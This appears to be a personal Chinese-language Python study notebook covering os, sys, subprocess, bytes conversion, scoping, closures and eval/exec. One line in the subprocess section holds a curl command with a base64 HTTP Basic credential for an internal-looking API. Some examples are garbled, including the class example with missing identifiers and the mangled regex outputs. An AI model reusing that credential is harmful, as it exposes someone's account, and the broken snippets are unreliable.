os.tty(fd)                  # 返回一个字符串,它表示与文件描述符fd 关联的终端设备。如果fd 没有与终端设备关联,则引发一个异常。
os.unlink(path)                 # 删除文件路径
os.utime(path, times)           # 返回指定的path文件的访问和修改的时间。
os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])  # 输出在文件夹中的文件名通过在树中游走,向上或者向下。
os.write(fd, str)               # 写入字符串到文件描述符 fd中. 返回实际写入的字符串长度
}
os.exec区别{
os.execl(path, arg0, arg1,    )
os.execle(path, arg0, arg1,    , env)
os.execlp(file, arg0, arg1,    )
os.execlpe(file, arg0, arg1,    , env)
os.execv(path, args)
os.execve(path, args, env)
os.execvp(file, args)
os.execvpe(file, args, env)

这些函数都执行一个新的程序,然后用新的程序替换当前子进程的进程空间,而该子进程从新程序的main函数开始执行。在Unix下,该新程序的进程id是原来被替换的子进程的进程id。在原来子进程中打开的所有描述符默认都是可用的,不会被关闭。
execv*系列的函数表示其接受的参数是以一个list或者是一个tuple表示的参数表
execl*系列的函数表示其接受的参数是一个个独立的参数传递进去的。

exec*p*系列函数表示在执行参数传递过去的命令时使用PATH环境变量来查找命令
exec*e系列函数表示在执行命令的时候读取该参数指定的环境变量作为默认的环境配置,最后的env参数必须是一个mapping对象,可以是一个dict类型的对象。




root@api:~# ps -ef|grep python
root     221441 221391  0 20:29 pts/9    00:00:00 python3.4
root     221579 221527  0 20:30 pts/10   00:00:00 grep --color=auto python

>>> os.execv('/bin/bash',('ls','-l'))
root@api:~#
#可以看出,的确是被子进程替换了。
root@api:~# ps -ef|grep 221441
root     221441 221391  0 20:29 pts/9    00:00:00 ls -l
root     221642 221527  0 20:31 pts/10   00:00:00 grep --color=auto 221441
root@api:~# exit
logout
root@api:~#
root@api:~# ps -ef|grep 221441
root     221890 221527  0 20:33 pts/10   00:00:00 grep --color=auto 221441

}
#sys 模块负责程序与python解释器的交互,提供了一系列的函数和变量,用于操控python的运行时环境
sys方法合集{
#sys模块用于提供对python解释器的相关操作。
sys.argv   			命令行参数List,第一个元素是程序本身路径
sys.modules			返回系统导入的模块字段,key是模块名,value是模块
sys.exit(n)        退出程序,正常退出时exit(0)
sys.version        获取Python解释程序的版本信息
sys.maxsize        最大的Int值
sys.maxunicode     最大的Unicode值
sys.path           返回模块的搜索路径,初始化时使用PYTHONPATH环境变量的值
sys.platform       返回操作系统平台名称
sys.stderr         错误输出
sys.stdin          标准输入
sys.stdout         标准输出
sys.stdout.write('please:')
val = sys.stdin.readline()[:-1]
sys.modules.keys() 返回所有已经导入的模块名
sys.modules.values() 返回所有已经导入的模块
sys.exc_info()     获取当前正在处理的异常类,exc_type、exc_value、exc_traceback当前处理的异常详细信息
sys.exit(n)        退出程序,正常退出时exit(0)
sys.hexversion     获取Python解释程序的版本值,16进制格式如：0x020403F0  >>> sys.hexversion >>>50594800
sys.version        获取Python解释程序的
sys.api_version    解释器的C的API版本
sys.version_info	‘final’表示最终,也有’candidate’表示候选,serial表示版本级别,是否有后继的发行
sys.displayhook(value)      如果value非空,这个函数会把他输出到sys.stdout,并且将他保存进__builtin__._.指在python的交互式解释器里,’_’ 代表上次你输入得到的结果,hook是钩子的意思,将上次的结果钩过来
sys.getdefaultencoding()    返回当前你所用的默认的字符编码格式
sys.getfilesystemencoding() 返回将Unicode文件名转换成系统文件名的编码的名字
sys.setdefaultencoding()用来设置当前默认的字符编码,如果和任何一个可用的编码都不匹配,抛出 LookupError,这个函数只会被site模块的sitecustomize使用,一旦别site模块使用了,他会从sys模块移除
sys.builtin_module_s    Python解释器导入的模块列表
sys.executable              Python解释程序路径
sys.getwindowsversion()     获取Windows的版本
sys.copyright      记录python版权相关的东西
sys.byteorder      本地字节规则的指示器,big-endian平台的值是’big’,little-endian平台的值是’little’
sys.exc_clear()    用来清除当前线程所出现的当前的或最近的错误信息
sys.exec_prefix    返回平台独立的python文件安装的位置

#比较小众或新增的函数,一般get都有对应的set方法
sys.settrace(tracer)  # settrace(function) 设置全局调试跟踪功能。 每一个都会被呼叫函数调用。
sys.ps1和sys.ps2	定义了两个提示符字符串
sys.dont_write_bytecode  如果这是真的,Python将不会尝试在导入源模块时写入.pyc文件。此值最初设置为True或False,但您可以自行设置它来控制字节码文件生成。
sys.executable		返回执行文件的绝对路径 '/usr/bin/python3.4'
sys.getallocatedblocks() 	返回解释器当前分配的内存块数,此功能主要用于跟踪和调试内存泄漏。 
sys.getrefcount(object) 	返回对象的引用计数。 返回的计数通常比您预期的高一个,因为它包含（临时）引用作为getrefcount（）的参数。
sys.setrecursionlimit(limit)|sys.getrecursionlimit()	 	将Python解释器堆栈的最大深度设置为int值limit。 这个限制可以防止无限次递归导致C堆栈溢出和崩溃的Python。递归深度的新限制太低,则会引发RecursionError异常。
sys.getsizeof(object[, default]) 	以字节返回对象的大小。 该对象可以是任何类型的对象。
sys.getswitchinterval() 		返回解释器的“线程切换间隔” 一般为0.005
sys.setswitchinterval(间隔)		设置解释器的线程切换间隔（以秒为单位）。 这个浮点值决定了分配给并行运行Python线程的“timeslices”的理想持续时间。
sys.setprofile(profilefunc)|sys.getprofile()  	设置系统的配置文件功能,可以在Python中实现Python源代码分析器。不适用于存在多个线程的情况。 多线程情况下使用threading.setprofile(func) 
sys.settrace(tracefunc)|sys.gettrace()			设置系统的跟踪功能,允许您在Python中实现Python源代码调试器。 该功能是线程特定的; 对于调试器来支持多个线程,必须使用settrace（）为被调试的每个线程注册。threading.settrace(func) 
sys.set_coroutine_wrapper()|sys.get_coroutine_wrapper()		允许拦截创建协同程序对象（只有由异步def函数创建的对象）;不会拦截用types.coroutine（）或asyncio.coroutine（）装饰的生成器）。
sys.hash_info		一个提供数字哈希实现参数的结构序列。
sys.implementation 	包含有关当前正在运行的Python解释器的实现的信息的对象:,version,hexversion,cache_tag
sys.intern(str)		函数作用在一个字符串上来限定intern以达到性能优化,可用于加快字典查找。
sys.is_finalizing()	如果Python解释器正在关闭,则返回True,否则返回False。
sys.last_type 
sys.last_value 
sys.last_traceback 
#这三个变量并不总是定义的; 当未处理异常时,它们被设置,并且解释器打印出错误消息和堆栈追溯。 它们的目的用途是允许交互式用户导入调试器模块并进行验尸调试,而无需重新执行导致错误的命令。
sys.tracebacklimit	当此变量设置为整数值时,它确定发生未处理异常时打印的追溯信息的最大级别数。 默认值为1000.当设置为0或更小时,所有回溯信息都将被抑制,并且仅打印异常类型和值。
sys.winver 		用于在Windows平台上形成注册表项的版本号
sys._xoptions 	通过-X命令行选项传递的各种实现特定标志的字典。 选项名称映射到它们的值,如果明确给出,或者为True。
python -Xa=b -Xc
>>> import sys
>>> sys._xoptions
{'a': 'b', 'c': True}
}
重定向{
import sys
print 'Dive in'
saveout = sys.stdout
fsock = open('out.log', 'w')
sys.stdout = fsock
print 'This message will be logged instead of displayed'
sys.stdout = saveout
fsock.close()


这样会打印到IDE的"交互窗口"中(或终端,如果你从命令行运行这一脚本)。
始终在重定向 stdout 之前保存它,这样你可以在后面将其设回正常。
打开一个新文件用于写入。 将所有后续的输出重定向到我们刚打开的新文件上。
这样只会将输出结果"打印"到日志文件中；在IDE窗口中或在屏幕上不会看到输出结果。
在我们将 stdout 搞乱之前,让我们把它设回原来的方式。关闭日志文件。

#重定向 stderr 完全以相同的方式进行,用 sys.stderr 代替 sys.stdout
import sys
fsock = open('error.log', 'w')
sys.stderr = fsock
raise Exception, 'this error will be logged'

打开我们想用来存储调试信息的日志文件。
将我们新打开的日志文件的文件对象赋给 stderr 重定向标准错误。
引发一个异常。从屏幕输出上我们可以注意到这样没有在屏幕上打印出任何东西。所以正常跟踪信息已经写进 error.log。
}
bytes{
创建一个bytes
>>> by=b'abc'
>>> type(by)
<class 'bytes'>
#str与bytes显示转换
str.encode()和bytes(S,  encoding)把一个字符串转换为其raw  bytes形式,并且在此过程中根据一个str创建一个bytes。
bytes.decode()和str(B,  encoding)把raw  bytes转换为其字符串形式,并且在此过程中根据一个bytes创建一个str。
>>> a='aadadwdawdwa'
>>> a.encode()
b'aadadwdawdwa'
>>> bytes('dawdawdawd',encoding='utf8')
b'dawdawdawd'

>>> str(b'dawdawdawd',encoding='utf8')
'dawdawdawd'

>>> ord('X')
88
>>> chr(88)
'X'
}
code{
#启动交互控制台, 类似启动Python 解释器
>>> import code
>>> console = code.InteractiveConsole()
>>> console.interact()
}

作用域-LEGB {
##LEGB 法则,具体如下：
python引用变量的顺序： 当前作用域局部变量->外层作用域变量->当前模块中的全局变量->python内置变量
#Python会按LEGB的顺序来搜索变量：
要说明的是,这里的访问规则只对普通变量有效, 对象属性的规则与这无关（简单地说,访问一个对象的属性与此无关）。
L. Local. 局部作用域,即函数中定义的变量（没有用global声明）
E. Enclosing. 嵌套的父级函数的局部作用域,即包含此函数的上级函数的局部作用域,比如上面的示例中的labmda所访问的x就在其父级函数test的局部作用域里。通常也叫non-local作用域。
G. Global(module). 在模块级别定义的全局变量（如果需要在函数内修改它,需要用global声明）
B. Built - in. built - in模块里面的变量,比如int, Exception等等
按这个查找原则,在第一处找到的地方停止。如果没有找到,Python 会报错的。
但此规则有一个重要的限制：
一个不在局部作用域里的变量默认是只读的,如果试图为其绑定一个新的值, Python认为是在当前的局部作用域里创建一个新的变量
#如果在函数内部对该变量进行了赋值操作,无论是在引用该变量之前还是在引用该变量之后,那么对于该函数来说,此变量是一个局部变量。>>>>>>>>>>局部变量!>>>>>>>>>>>>局部变量!>>>>>>>>>>局部变量!

global 关键字用来在函数或其他局部作用域中使用全局变量。但是如果不修改全局变量也可以不使用global关键字。不影响其他的作用域在函数中定义和修改全局变量,需要使用global关键字。
nonlocal 关键字用来在函数或其他作用域中使用外层(非全局)变量。

#这个需要好好理解一下啊！
# local 赋值语句是无法改变 scope_test 的 spam 绑定。
# nonlocal 赋值语句改变了scope_test 的spam绑定
# global 赋值语句从 块级改变了spam绑定
def scope_test():
    spam = "test spam"
    def do_local():
        spam = "local spam"

    def do_nonlocal():
        nonlocal spam
        spam = "nonlocal spam"

    def do_global():
        global spam
        spam = "global spam"

    do_local()
    print("After local assignment:", spam)
    do_nonlocal()
    print("After nonlocal assignment:", spam)
    do_global()
    print("After global assignment:", spam)

scope_test()
print("In global scope:", spam)

"""
After local assignment: test spam
After nonlocal assignment: nonlocal spam
After global assignment: nonlocal spam
In global scope: global spam

"""
#对于int和str类型的变量,改变值就是改变了地址,id(a)可以看出变化
def mydome():
    a = 1
    print("id0:", id(a), "a:", a)
    def do1():
        a = 2
        print("id1:", id(a), "a:", a)
    def do2():
        print("id2:", id(a), "a:", a)
    def do3():
        print("id3:", id(a), "a:", a)
    def do4():
        nonlocal a  # 在函数内部改变mydome中a的绑定
        print("id4:", id(a), "a:", a)
        a = "nonlocal a"
        #a = 3
        print("id5:", id(a), "a:", a)
    def do5():
        global a  # 定义了全局变量a,和mydome中的a互不影响
        a = "global a"
        print("id6:", id(a), "a:", a)

    do1()
    do2()
    do3()
    do4()
    do5()
    print("id7:", id(a), "a:", a)

print("-------------------")
mydome()
print("id8:", id(a), "a:", a)

"""
id0: 1644324992 a: 1
id1: 1644325008 a: 2
id2: 1644324992 a: 1
id3: 1644324992 a: 1
id4: 1644324992 a: 1
id5: 32305864 a: nonlocal a
id6: 32305904 a: global a
id7: 32305864 a: nonlocal a
id8: 32305904 a: global a
"""

a=1
print(a)
def pp():
      #a=2 #在函数内部对该变量进行了赋值操作,无论是在引用该变量之前还是在引用该变量之后,
      #那么对于该函数来说,此变量是一个局部变量
      print(a)
      a=a+1
      print(a)

pp()
#报错UnboundLocalError: local variable 'a' referenced before assignment

如果在函数内部从未对该变量进行赋值操作,那么对于该函数来说,此变量是一个全局变量。
在同一个源文件中,全局变量和局部变量同名时,在局部变量的作用范围内,全局变量不起作用,局部变量与全局变量同名时,在局部变量使用的函数范围内,需要先定义局部变量后使用,如下：
global语句的作用是将某些变量声明为全局变量,当关键词global后面跟随多个变量名称时,各名称之间要用逗号分隔开来。
a=1
def m():
	print a
	a=2
#上例中是错误示范,报错UnboundLocalError: local variable 'a' referenced before assignment
def n():
	a=2
	print a
上例为正确示范,但a=2还是局部变量,不会改变全局变量a=1的值
函数中与全局变量重名的变量的作用域做一个更加全面的总结：
#如果在函数内部对该变量进行了赋值操作,无论是在引用该变量之前还是在引用该变量之后,那么对于该函数来说,此变量是一个局部变量。
#如果在函数内部从未对该变量进行赋值操作,那么对于该函数来说,此变量是一个全局变量。
#如果该变量用global语句声明为全局变量,那么无论是否对其进行了赋值操作,该变量都将作为全局变量。

#为一个定义在函数外的变量赋值
a=[1,2,3]
def aa():
      global a
      a=[2,3,4]
      #global a=[2,3,4] #这样是错误的！
      print(a)
print(a)
aa()
print(a)

'''
[1, 2, 3]
[2, 3, 4]
[2, 3, 4]
'''

#常见错误

#可选参数默认值的设置在Python中只会被执行一次,也就是定义该函数的时候。
#错误地  将表达式/可变类型当默认值时
>>> def foo(bar=[]):        # bar是可选参数,如果没有提供bar的值,则默认为[],
   .    bar.append("baz")    # 但是稍后我们会看到这行代码会出现问题。
   .    return bar

1.>>> foo()
2.["baz"]
3.>>> foo()
4.["baz", "baz"]
5.>>> foo()
6.["baz", "baz", "baz"]

解决方法：
>>> def foo(bar=None):
2   .    if bar is None:    # or if not bar:
3   .        bar = []
4   .    bar.append("baz")
5   .    return bar
6   .
7.>>> foo()
8.["baz"]
9.>>> foo()
10.["baz"]
11.>>> foo()
12.["baz"]
#库
https://github.com/vinta/awesome-python#third-party-apis
}
python中函数的实参传递规则{
1.标注了参数名的就要按参数名传递,打乱顺序的情况下一定要加参数名,否则会混乱的。
2.没有缺省的实参情况下就会依次传递,如果不够的话,后面的会自动去取自己的缺省值。
3.如果实参的数量比形参要多的话,就要用到带*号的参数名了。需要注意的是默认参数在形式参数表中的位置,即默认参数必须在所有标准参数之后定义.
4.默认参数一定要用不可变对象,如果是可变对象,运行会有逻辑错误！
5.要注意定义可变参数和关键字参数的语法：*args是可变参数,args接收的是一个tuple；**kw是关键字参数,kw接收的是一个dict,* 必须在** 之前出现。
调用函数时如何传入可变参数和关键字参数的语法：
可变参数既可以直接传入：func(1,2,3),又可以先组装list或tuple,再通过*args传入：func(*(1,2,3))；
关键字参数既可以直接传入：func(a=1,b=2),又可以先组装dict,再通过**kw传入：func(**{'a':1,'b':2})。
#任何出现在*args 后的参数是关键字参数,只能被用作关键字,而不是位置参数
}
Python执行Linux系统命令,即在Python脚本中调用Shell命令,具体有以下四种方法{
#后面有更详细的解释和实例
#参考 http://www.cnblogs.com/HQMIS/archive/2013/02/03/2890892.html
1、os.system
//仅仅在一个子终端运行系统命令,而不能获取命令执行后的返回信息system(command) //直接打印结果出来,不容易获取结果：>>> os.system('ls')

2、os.popen
//该方法不但执行命令还返回执行后的信息对象
popen(command [, mode='r' [, bufsize]])

3、使用模块 subprocess
>>> import subprocess
>>> subprocess.call(["cmd", "arg1", "arg2"],shell=True)
//获取返回和输出：
>>> import subprocess
>>> returnCode = subprocess.call('ls') #代替os.system('ls')
client.py  service.py
>>>
>>> returnCode
0
>>> returnCode = subprocess.check_output('ls') #代替os.popen
>>>
>>> returnCode
b'client.py\nservice.py\n'
#subprocess.Popen使用
#参考  http://www.cnblogs.com/zhoug2020/p/5079407.html  十分详细的解说
subprocess.Popen(["cat","test.txt"]) #或者
>>> a=subprocess.Popen('dwad',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
>>>
>>> a.stdout.read()
b''
>>> a.stderr.read()
b'/bin/sh: 1: dwad: not found\n'
>>>
#http://www.cnblogs.com/GODYCA/archive/2013/05/08/3066870.html
>>> p1=subprocess.Popen('ps -ef|grep python',shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)  #stderr=subprocess.STDOUT 将子程序的标准错误汇合到标准输出也就是stdout=subprocess.PIPE
>>> p1.stdout.read()
b'root     136687 139361  0 14:09 pts/41   00:00:00 /bin/sh -c ps -ef|grep python\nroot     136692 136687  0 14:09 pts/41   00:00:00 grep python\nroot     139361 133063  0 Oct13 pts/41   00:00:00 python3.4\n'

>>> a=subprocess.Popen('ls',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
>>> a.communicate()
(b'client.py\nservice.py\n', b'')


4、使用模块 commands  #2.7版本
>>> import commands>>> dir(commands)['__all__', '__builtins__', '__doc__', '__file__', '____', 'getoutput', 'getstatus','getstatusoutput', 'mk2arg', 'mkarg']>>> commands.getoutput("date")'Wed Jun 10 19:39:57 CST 2009'>>>>>> commands.getstatusoutput("date")(0, 'Wed Jun 10 19:40:41 CST 2009')
a="curl  -v -X POST -H "Authorization:Basic c3Vic2NyaWJlcjpTc01pbmkxQA==" 'http://188.105.109.200:9763/appmgt/api/v1/?=IOTAppTestq&quota_prod=0-0&quota_sand=0-0&redirect_url=http://www.baidu.com'"
}
python模块的导入 {
1、导入模块名用 import module_; 导入模块中的子项目用 from module_ import xxx
2、访问模块内部的函数,类以及各种属性
3、要导入的模块应该被放置和调用它的程序相同的目录中,或者在sys.path 变量所列目录之一
4、当你要导入一个模块时,python会依次在这些目录里寻找与你要导入的模块名称一致的py文件
5、并不是所有的模块都是以py文件存在的,比如内置模块,它们的py源代码并不可见,因为它们不适用python写成的
6、每个模块都有____属性,当模块被导入使用时,它的值为模块名；而当模块是被直接运行时,它便是__main__

http://www.cnblogs.com/duex/p/6703009.html  导入自定义模块的三种方式
1. py执行文件和模块同属于同个目录(父级目录)直接import
2. 先导入sys模块,然后通过sys.path.append(path) 函数来导入自定义模块所在的目录,导入自定义模块。
import sys,sys.path.append(r"C:\Users\Pwcong\Desktop\python"),import pwcong
3. 系统变量,python会扫描path变量的路径来导入模块,可以在系统path里面添加

}
python中 字节(bytes)、字符(chr)、字符串(str)、int 的学习总结{

1 bit = 1 二进制数据
1 byte = 8 bit   >> 1 字节 = 8 比特  python 中 bytes must be in range(0, 256) #参见后面
1 字母 = 1 byte = 8 bit(位)
1 汉字 = 2 byte = 16 bit

文件读写{
w=open("e:\\bin.txt",'wb')
>>> w.write(bytes('我',encoding='gbk'))
2
>>> w.write(bytes('我',encoding='utf8'))
3
>>> w.close()

#已不同编码打开后看到的
我鎴?
?我

如果以下面的方式打开都会报 "UnicodeDecodeError"
q=open('e://bin.txt',encoding='utf8')
q=open('e://bin.txt',encoding='gbk')

q=open('e://bin.txt','rb')
q.read()
>>>b'\xce\xd2\xe6\x88\x91'

str(b'\xce\xd2',encoding='gbk')
>>>'我'
str(b'\xe6\x88\x91',encoding='gbk')
>>>'我'
}

bit 与 int 的转换{
>>> int('0b1010101010101010101010',base=0) #base=0 解释为代码字面量
2796202
>>> int('1010101010101010101010',base=2) #base=2 二进制
2796202
 >>> bin(2796202)  #只是将int用bit记数,只是二进制位换算,当写入文件后保存的二进制并不是'0b1010101010101010101010',而是通过编码方式决定的。
'0b1010101010101010101010'

>>> hex(15456)
'0x3c60'
>>> int('0x3c60',base=16)
15456
}

str 与 bytes 的互转{
>>> bytes("A",encoding='gbk')
b'A'
>>> str(b'A',encoding='gbk')
'A'

>>> a=bytes('我',encoding='utf8')
>>> a
b'\xe6\x88\x91'
>>> a.decode(encoding='utf8')
'我'

>>> bytes("你",encoding='utf8')
b'\xe4\xbd\xa0'
>>>
>>> str(b'\xe4\xbd\xa0',encoding='utf8')
'你'

>>> str(b'Zoot!',encoding='utf8')
'Zoot!'
>>> str(b'Zoot!')
"b'Zoot!'"
}

int 与 str 的互转{

>>> str(21)
'21'
>>> int('21')
21
}

int 和 bytes 的互转{

class bytes(object) #python 中bytes的构造函数
{
 bytes(iterable_of_ints) -> bytes
 bytes(string, encoding[, errors]) -> bytes
 bytes(bytes_or_buffer) -> immutable copy of bytes_or_buffer
 bytes(int) -> bytes object of size given by the parameter initialized with null bytes
 bytes() -> empty bytes object
 }
#字符转换
{
>>> a=bytes([97])
>>> a
b'a'
>>> a.decode()
'a'
>>> chr(97)
'a'
>>> ord('a')
97
>>> ord(bytes([97]).decode())
97

#Unicode字符转换
>>> chr(97)
'a'
>>> ord("a")
97
>>> ord('a')
97
>>> bytes(97)  #建立97个null bytes
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
#python2.7中有如下效果
>>> a='关于'
>>> a
'\xe5\x85\xb3\xe4\xba\x8e'
>>> a=b'\xe5\x85\xb3\xe4\xba\x8e'
>>> str(a,encoding='utf8')
'关于'
}
#字面换算
{
>>> (34).to_bytes(10,byteorder='little')
b'"\x00\x00\x00\x00\x00\x00\x00\x00\x00'
>>> int.from_bytes(b'"\x00\x00\x00\x00\x00\x00\x00\x00\x00',byteorder='little')
34
"""byteorder 参数确定用于表示整数的字节顺序。如果字节序是 "big",则最高有效字节在字节数组的开始。如果字节序是 "little",最高有效字节在字节数组的结尾。 要请求主机系统的本机字节顺序,请使用sys.byteorder作为字节顺序值。"""
>>> (512).to_bytes(2, byteorder='big')
b'\x02\x00'
>>> (511).to_bytes(2, byteorder='big')
b'\x01\xff'
>>> (5120).to_bytes(2, byteorder='big')
b'\x14\x00'

>>> (51202000).to_bytes(5, byteorder='big')
b'\x00\x03\rG\xd0'
>>> (51202000).to_bytes(4, byteorder='big')
b'\x03\rG\xd0'
>>> (51202000).to_bytes(3, byteorder='big')
Traceback (most recent call last):
  File "<pyshell#706>", line 1, in <module>
    (51202000).to_bytes(3, byteorder='big')
OverflowError: int too big to convert

以上都是将int换算成二进制

#计算方法
{
ord(b'\x01')*2**8+ord(b'\xff')*2**0
511
a=(2543).to_bytes(4, byteorder='big')
>>> a
b'\x00\x00\t\xef'
>>> for x in a:
	print(x)
0 0 9 239

9*2**8+239=2543
}
bytes 转 int
>>> int.from_bytes(b'\x00\x00\t\xef', byteorder='big')
2543

>>> (1024).to_bytes(2, sys.byteorder)
b'\x00\x04'
>>> ord(b'\x04')
4
4*2**8=1024

'\xff'中'\x'组合表示是一个十六进制数,它代表一个不可见字符的ASCII码
>>> ord(b'\xff')
255
}
}
}
bytearray 可以对 bytes 进行修改{
>>> bytes("我是中国人",encoding='gbk')
b'\xce\xd2\xca\xc7\xd6\xd0\xb9\xfa\xc8\xcb'
>>> a=bytearray("我是中国人",encoding='gbk')
>>> a
bytearray(b'\xce\xd2\xca\xc7\xd6\xd0\xb9\xfa\xc8\xcb')

>>> bytes(range(256))
b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'

'`
}
深浅拷贝{
浅拷贝：对一个对象进行浅拷贝其实是新创建一个类型跟原对象一样,其内容是原来对象的引用。有以下几种方式实施(1)完全切片操作[:];(2)利用工厂函数,比如list(),dict()等；(3)使用copy模块的copy函数。
深拷贝: 希望拷贝的对象是独立的,修改时不要影响其它值,这种我们称为深拷贝。实现深拷贝我们需要引用一个copy模块,copy模块有两个函数可用,一个是copy浅拷贝；另一个是deepcopy深拷贝。
#http://www.cnblogs.com/wilber2013/p/4645353.html
Python中对象的赋值都是进行对象引用(内存地址)传递
使用copy.copy(),可以进行对象的浅拷贝,它复制了对象,但对于对象中的元素,依然使用原始的引用.
如果需要复制一个容器对象,以及它里面的所有元素(包含元素的子元素),可以使用copy.deepcopy()进行深拷贝
对于非容器类型(如数字、字符串、和其他'原子'类型的对象)没有被拷贝一说
如果元祖变量只包含原子类型对象,则不能深拷贝,看下面的例子

}
闭包{

#如果要实现两个功能,可以定义两个函数。
def func_150(val):
    passline = 90  #150
    if val >= passline:
        print ("pass")
    else:
        print ("failed")

def func_100(val):
    passline = 60  #150
    if val >= passline:
        print ("pass")
    else:
        print ("failed")

func_100(69)#pass
func_150(69)#failed

#如果用闭包的话只需要定义一个函数
def set_passline(passline):#passline
    def cmp(val):
        if val >= passline:
            print ("pass")
        else:
            print ("failed")
    return cmp  #返回值是一个函数

f_100 = set_passline(60) #f_100就是cmp,f_100()就是cmp(),而且内置一个passline=60
f_150 = set_passline(90)

f_100(69)#pass
f_150(69)#failed

#闭包说的简单点就是,函数a中定义函数b,函数b可以使用函数a中的变量

}
多态{

class Person(object):
    def __init__(self, , gender):
        self. = 
        self.gender = gender
    def whoAmI(self):
        return 'I am a Person, my  is %s' % self.

class Student(Person):
    def __init__(self, , gender, score):
        super(Student, self).__init__(, gender)
        self.score = score
    def whoAmI(self):
        return 'I am a Student, my  is %s' % self.

class Teacher(Person):
    def __init__(self, , gender, course):
        super(Teacher, self).__init__(, gender)
        self.course = course
    def whoAmI(self):
        return 'I am a Teacher, my  is %s' % self.
#在一个函数中,如果我们接收一个变量 x,则无论该 x 是 Person、Student还是 Teacher,都可以正确打印出结果：

def who_am_i(x):
    print (x.whoAmI())

p = Person('Tim', 'Male')
s = Student('Bob', 'Male', 88)
t = Teacher('Alice', 'Female', 'English')

who_am_i(p)
who_am_i(s)
who_am_i(t)


}
动态生成变量 eval 和 exec{
#方法1
#Python的变量名就是一个字典的key而已。要获取这个字典,直接用locals和globals
>>> a=1
>>> b=2
>>> locals()['a%s'%b]=3
>>> a2
3

>>> globals()['aa']=4
>>> aa
4
#方法2
>>> a=1
>>> b=2
>>> exec('ab=a+b')
>>> ab
3

Python有时需要动态的创造Python代码,然后将其作为语句执行或作为表达式计算。
exec用于执行存储在字符串中的Python代码。

eval 的用途；可以把list,tuple,dict和string相互转化。
可以把list,tuple,dict和string相互转化。

语法： eval(source[, globals[, locals]]) -> value
参数：
　　　　source：一个Python表达式或函数compile()返回的代码对象
　　　　globals：可选。必须是dictionary
　　　　locals：可选。任意map对象
		globals变量作用域,locals变量作用域

如果指定globals参数：
g = {'b' : 10}
eval('b*2', g)
输出：20

如果指定locals参数：
g={'a':6,'b':8}
l={'b':9,'c':10}
eval("a+b+c",g,l)
输出：25

#################################################
字符串转换成列表
>>>a = "[[1,2], [3,4], [5,6], [7,8], [9,0]]"
>>>type(a)
<type 'str'>
>>> b = eval(a)
>>> print b
[[1, 2], [3, 4], [5, 6], [7, 8], [9, 0]]
>>> type(b)
<type 'list'>
#################################################
字符串转换成字典
>>> a = "{1: 'a', 2: 'b'}"
>>> type(a)
<type 'str'>
>>> b = eval(a)
>>> print b
{1: 'a', 2: 'b'}
>>> type(b)
<type 'dict'>
#################################################
字符串转换成元组
>>> a = "([1,2], [3,4], [5,6], [7,8], (9,0))"
>>> type(a)
<type 'str'>
>>> b = eval(a)
>>> print b
([1, 2], [3, 4], [5, 6], [7, 8], (9, 0))
>>> type(b)
<type 'tuple'>


# ast.literal_eval(node_or_string) 也是可以的,比eval安全
}

十二种常用操作集锦{
Python编程中常用的12种基础知识总结：正则表达式替换,遍历目录方法,列表按列排序、去重,字典排序,字典、列表、字符串互转,时间对象操作,命令行参数解析(getopt),print 格式化输出,进制转换,Python调用系统命令或者脚本,Python 读写文件。
1、正则表达式替换{
目标: 将字符串line中的 overview.gif 替换成其他字符串
>>>line = '<IMG ALIGN="middle" SRC=\'#\'" /span>
>>> mo=re.compile(r'(?<=SRC=)"([\w+\.]+)"',re.I)

>>> mo.sub(r'"\1****"',line)
'<IMG ALIGN="middle" SRC=\'#\'" /span>

>>> mo.sub(r'replace_str_\1',line)
'<IMG ALIGN="middle" replace_str_overview.gif BORDER="0" ALT="">'< /span>

>>> mo.sub(r'"testetstset"',line)
'<IMG ALIGN="middle" SRC=\'#\'" /span>

注意: 其中 \1 是匹配到的数据,可以通过这样的方式直接引用}
2、遍历目录方法  good{
在某些时候,我们需要遍历某个目录找出特定的文件列表,可以通过os.walk方法来遍历,非常方便
其中第一个为起始路径,第二个为起始路径下的文件夹,第三个是起始路径下的文件.

import os
fileList = []
rootdir = "/data"
for root, subFolders, files in os.walk(rootdir):
  if '.svn' in subFolders: subFolders.remove('.svn')  # 排除特定目录
  for file in files:
    if file.find(".t2t") != -1:# 查找特定扩展名的文件
      file_dir_path = os.path.join(root,file)
      fileList.append(file_dir_path)

print fileList


import xlrd
import os
import sys
"""可直接在任一目录执行,但需要xlrd库支持,有基本的错误处理,会自动跳过空白页和不是文本用例的表格,具体执行时请注意观察有没有错误的格式"""
path=sys.path[0]
file=os.walk(path)
fileList = []
for x,y,z in file:
	for q in z:
